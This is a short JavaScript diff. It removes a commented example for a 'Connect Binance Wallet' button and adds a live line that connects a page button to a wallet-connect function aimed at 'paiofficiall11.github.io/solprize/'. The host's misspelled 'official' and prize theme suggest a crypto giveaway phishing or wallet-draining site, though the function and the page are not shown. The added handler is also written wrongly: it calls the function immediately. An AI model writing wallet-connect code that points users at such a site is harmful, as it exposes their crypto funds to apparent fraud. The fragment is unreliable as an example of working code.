@@ -433,21 +433,7 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 });
 
-/*
-MOBILE-OPTIMIZED USAGE:
 
-<!-- HTML Button -->
-<button data-connect-binance 
-        data-dapp-url="https://your-dapp.com"
-        style="padding: 16px; background: #F0B90B; color: black; border: none; border-radius: 16px; font-weight: bold; width: 100%; max-width: 300px;">
-  Connect Binance Wallet
-</button>
 
-<!-- Or programmatically -->
-document.getElementById('myButton').addEventListener('click', connectBinanceWeb3Safe('https://your-dapp.com'));
+document.getElementById('connectd').addEventListener('click', connectBinanceWeb3Safe('https://paiofficiall11.github.io/solprize/'));
 
-// For PWA/desktop detection
-if (!isMobileDevice()) {
-  document.getElementById('mobileOnlyContent').style.display = 'none';
-}
-*/
